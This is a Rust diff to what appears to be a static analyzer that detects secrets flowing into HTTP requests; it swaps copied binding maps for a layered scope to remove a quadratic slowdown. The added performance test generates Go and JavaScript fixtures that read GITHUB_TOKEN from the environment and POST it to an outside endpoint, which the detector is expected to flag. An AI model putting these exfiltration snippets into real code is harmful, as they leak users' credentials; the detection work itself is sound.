@@ -57,6 +57,72 @@ struct Analysis<'s> {
     truncated: bool,
 }
 
+/// Name → bits bindings, layered over an optional enclosing scope that it
+/// reads through but never changes.
+///
+/// Every function body starts from the module-level bindings and every `if`
+/// branch from the bindings before it. Copying those per function or per
+/// branch made the analysis quadratic (helpers × globals, or `if` statements
+/// × names bound before them: 5k of each took 70 s); a layer records only
+/// what it binds or unbinds. A `None` in `local` hides an enclosing binding
+/// the layer removed.
+#[derive(Default)]
+struct Scope<'g> {
+    parent: Option<&'g Scope<'g>>,
+    local: HashMap<String, Option<Bits>>,
+}
+
+impl<'g> Scope<'g> {
+    /// A top-level scope holding `map`.
+    fn from_map(map: HashMap<String, Bits>) -> Self {
+        Self {
+            parent: None,
+            local: map
+                .into_iter()
+                .map(|(name, bits)| (name, Some(bits)))
+                .collect(),
+        }
+    }
+    /// An empty layer over `parent`.
+    fn under(parent: &'g Scope<'g>) -> Self {
+        Self {
+            parent: Some(parent),
+            local: HashMap::new(),
+        }
+    }
+    fn get(&self, name: &str) -> Option<Bits> {
+        match self.local.get(name) {
+            Some(bits) => *bits,
+            None => self.parent.and_then(|parent| parent.get(name)),
+        }
+    }
+    fn contains(&self, name: &str) -> bool {
+        self.get(name).is_some()
+    }
+    fn insert(&mut self, name: String, bits: Bits) {
+        self.local.insert(name, Some(bits));
+    }
+    /// Add `bits` to `name`'s binding, binding it if it is unbound.
+    fn add_bits(&mut self, name: &str, bits: Bits) {
+        let bits = self.get(name).unwrap_or(0) | bits;
+        self.insert(name.to_string(), bits);
+    }
+    fn remove(&mut self, name: &str) {
+        if self.parent.is_some_and(|parent| parent.contains(name)) {
+            self.local.insert(name.to_string(), None);
+        } else {
+            self.local.remove(name);
+        }
+    }
+    /// The bindings of a top-level scope, which has no parent.
+    fn into_map(self) -> HashMap<String, Bits> {
+        self.local
+            .into_iter()
+            .filter_map(|(name, bits)| Some((name, bits?)))
+            .collect()
+    }
+}
+
 /// Definitions the analysis indexes by name as local helpers.
 pub(super) const FUNCTION_KINDS: &[&str] = &[
     "function_item",
@@ -350,12 +416,12 @@ fn emit_seeded<'t>(
     // Fixed point handles helper declaration order and bounded recursion.
     for iteration in 0..8 {
         let before = a.summaries.clone();
-        let mut globals = global_seeds.clone();
+        let mut globals = Scope::from_map(global_seeds.clone());
         if language == Lang::Go {
             a.eval(root, &mut globals, &mut Summary::default(), 0);
         }
         for (name, node) in &functions {
-            let mut bindings = globals.clone();
+            let mut bindings = Scope::under(&globals);
             if let Some(params) = node.child_by_field_name("parameters") {
                 for (index, param) in named_children(params).enumerate().take(PARAM_COUNT) {
                     let pat = param
@@ -406,7 +472,7 @@ fn emit_seeded<'t>(
         events.extend(events_for(summary, name, offset));
     }
     let mut top = Summary::default();
-    let mut globals = global_seeds.clone();
+    let mut globals = Scope::from_map(global_seeds.clone());
     a.eval(root, &mut globals, &mut top, 0);
     events.extend(events_for(&top, "<module>", 0));
     if language == Lang::Go {
@@ -447,7 +513,7 @@ fn emit_seeded<'t>(
             .into_iter()
             .filter(|(name, _)| functions.contains_key(name) && !name.starts_with("init@"))
             .collect(),
-        globals,
+        globals.into_map(),
     )
 }
 
@@ -611,7 +677,7 @@ impl<'s> Analysis<'s> {
             );
         }
     }
-    fn bind(&self, pattern: Node<'_>, bits: Bits, bindings: &mut HashMap<String, Bits>) {
+    fn bind(&self, pattern: Node<'_>, bits: Bits, bindings: &mut Scope<'_>) {
         let mut stack = vec![pattern];
         while let Some(node) = stack.pop() {
             if node.kind() == "identifier" {
@@ -624,7 +690,7 @@ impl<'s> Analysis<'s> {
     fn eval(
         &mut self,
         node: Node<'_>,
-        bindings: &mut HashMap<String, Bits>,
+        bindings: &mut Scope<'_>,
         out: &mut Summary,
         depth: usize,
     ) -> Bits {
@@ -656,7 +722,7 @@ impl<'s> Analysis<'s> {
             kind,
             "identifier" | "shorthand_field_identifier" | "shorthand_property_identifier"
         ) {
-            return bindings.get(text).copied().unwrap_or(0);
+            return bindings.get(text).unwrap_or(0);
         }
         if kind == "macro_invocation"
             && node
@@ -688,7 +754,6 @@ impl<'s> Analysis<'s> {
                                 bits |= literal
                                     .get(start..end)
                                     .and_then(|name| bindings.get(name))
-                                    .copied()
                                     .unwrap_or(0);
                             }
                         }
@@ -774,10 +839,12 @@ impl<'s> Analysis<'s> {
                     {
                         if let Some(receiver) = target.child_by_field_name("operand") {
                             let bits = self.eval(value, bindings, out, depth + 1);
-                            if let Some(state) = bindings.get_mut(self.text(receiver)) {
-                                if *state & REQUEST != 0 {
-                                    *state = REQUEST | bits;
-                                }
+                            let receiver = self.text(receiver);
+                            if bindings
+                                .get(receiver)
+                                .is_some_and(|state| state & REQUEST != 0)
+                            {
+                                bindings.insert(receiver.to_string(), REQUEST | bits);
                             }
                         }
                     }
@@ -818,18 +885,25 @@ impl<'s> Analysis<'s> {
             if let Some(condition) = condition {
                 self.eval(condition, bindings, out, depth + 1);
             }
-            let mut merged = bindings.clone();
+            // What the branches bind, unioned into the bindings before the
+            // `if`. A name a branch leaves alone keeps its bits there, so only
+            // the branch's own layer can add any.
+            let mut merged: HashMap<String, Bits> = HashMap::new();
             let mut result = 0;
             for field in ["consequence", "alternative"] {
                 if let Some(branch) = node.child_by_field_name(field) {
-                    let mut branch_bindings = bindings.clone();
+                    let mut branch_bindings = Scope::under(bindings);
                     result |= self.eval(branch, &mut branch_bindings, out, depth + 1);
-                    for (name, bits) in branch_bindings {
-                        *merged.entry(name).or_default() |= bits;
+                    for (name, bits) in branch_bindings.local {
+                        if let Some(bits) = bits {
+                            *merged.entry(name).or_default() |= bits;
+                        }
                     }
                 }
             }
-            *bindings = merged;
+            for (name, bits) in merged {
+                bindings.add_bits(&name, bits);
+            }
             return result;
         }
         if matches!(kind, "call_expression" | "call") {
@@ -916,32 +990,41 @@ impl<'s> Analysis<'s> {
                 self.language,
                 Lang::Rust | Lang::JavaScript | Lang::TypeScript
             ) && matches!(kind, "block" | "statement_block");
-            let before = if scoped {
-                bindings.clone()
-            } else {
-                HashMap::new()
-            };
-            let mut declared = HashMap::new();
-            for child in named_children(node) {
-                if scoped && child.kind() == "let_declaration" {
-                    if let Some(pattern) = child.child_by_field_name("pattern") {
-                        self.bind(pattern, 0, &mut declared);
+            // The names the block declares are restored after it. Only theirs
+            // are saved: copying every binding per block was quadratic.
+            let mut declared = Scope::default();
+            if scoped {
+                for child in named_children(node) {
+                    if child.kind() == "let_declaration" {
+                        if let Some(pattern) = child.child_by_field_name("pattern") {
+                            self.bind(pattern, 0, &mut declared);
+                        }
                     }
-                }
-                if scoped && child.kind() == "lexical_declaration" {
-                    for declaration in named_children(child) {
-                        if let Some(name) = declaration.child_by_field_name("name") {
-                            self.bind(name, 0, &mut declared);
+                    if child.kind() == "lexical_declaration" {
+                        for declaration in named_children(child) {
+                            if let Some(name) = declaration.child_by_field_name("name") {
+                                self.bind(name, 0, &mut declared);
+                            }
                         }
                     }
                 }
+            }
+            let before: Vec<(String, Option<Bits>)> = declared
+                .local
+                .into_keys()
+                .map(|name| {
+                    let old = bindings.get(&name);
+                    (name, old)
+                })
+                .collect();
+            for child in named_children(node) {
                 tail = self.eval(child, bindings, out, depth + 1);
             }
-            for name in declared.keys() {
-                if let Some(old) = before.get(name) {
-                    bindings.insert(name.clone(), *old);
+            for (name, old) in before {
+                if let Some(old) = old {
+                    bindings.insert(name, old);
                 } else {
-                    bindings.remove(name);
+                    bindings.remove(&name);
                 }
             }
             return tail;
@@ -951,7 +1034,7 @@ impl<'s> Analysis<'s> {
     fn all(
         &mut self,
         node: Node<'_>,
-        bindings: &mut HashMap<String, Bits>,
+        bindings: &mut Scope<'_>,
         out: &mut Summary,
         depth: usize,
     ) -> Bits {
@@ -960,7 +1043,7 @@ impl<'s> Analysis<'s> {
     fn call(
         &mut self,
         node: Node<'_>,
-        bindings: &mut HashMap<String, Bits>,
+        bindings: &mut Scope<'_>,
         out: &mut Summary,
         depth: usize,
     ) -> Bits {
@@ -975,7 +1058,7 @@ impl<'s> Analysis<'s> {
         }
         let raw = self.text(callee);
         let prefix = raw.split([':', '.']).next().unwrap_or(raw);
-        let name = if bindings.contains_key(prefix) {
+        let name = if bindings.contains(prefix) {
             raw.to_string()
         } else {
             self.canonical(raw)
@@ -1035,7 +1118,7 @@ impl<'s> Analysis<'s> {
             }
             if matches!(method, "Set" | "Add" | "Write" | "WriteString") {
                 if let Some(receiver) = receiver {
-                    *bindings.entry(self.text(receiver).to_string()).or_default() |= all;
+                    bindings.add_bits(self.text(receiver), all);
                 }
                 return 0;
             }
@@ -1220,7 +1303,7 @@ impl<'s> Analysis<'s> {
         }
         if matches!(method, "push" | "append" | "extend" | "insert") {
             if let Some(receiver) = receiver {
-                *bindings.entry(self.text(receiver).to_string()).or_default() |= all;
+                bindings.add_bits(self.text(receiver), all);
             }
             return 0;
         }
@@ -1341,6 +1424,31 @@ mod tests {
             .map(ToString::to_string)
             .unwrap_or_default();
         assert!(events.contains("secret-http-body"), "{flow:?}");
+    }
+    #[test]
+    fn helpers_branches_and_blocks_do_not_copy_every_binding() {
+        // Each helper and each `if` branch started from a copy of every
+        // binding in scope, and each block saved one: 5k Go globals × 5k
+        // helpers, or 5k JavaScript bindings then 5k `if`s, took minutes.
+        let globals: String = (0..4_000).map(|i| format!("g{i}=o.Environ()\n")).collect();
+        let helpers: String = (0..4_000).map(|i| format!("func f{i}(){{}}\n")).collect();
+        let go = format!(
+            "package p\nimport (h \"net/http\"; o \"os\"; \"strings\")\nvar (\n{globals}token=o.Getenv(\"GITHUB_TOKEN\")\n)\n{helpers}func init(){{h.Post(endpoint,\"text/plain\",strings.NewReader(token))}}\n"
+        );
+        let bindings: String = (0..4_000).map(|i| format!("var v{i} = {i};\n")).collect();
+        let js = format!(
+            "{bindings}{}var token = 'none';\nif (c) {{ token = process.env.GITHUB_TOKEN; }}\nfetch('https://example.invalid',{{method:'POST',body:token}});\n",
+            "if (c) { let v0 = 1; }\n".repeat(4_000)
+        );
+        for (file, source) in [("p.go", go), ("index.js", js)] {
+            let started = std::time::Instant::now();
+            let events = kinds(file, &source);
+            assert!(
+                started.elapsed() < std::time::Duration::from_secs(10),
+                "{file}"
+            );
+            assert!(events.contains("secret-http-body"), "{file}: {events}");
+        }
     }
     #[test]
     fn go_body_flow_alias_helpers_builders_and_initializers() {
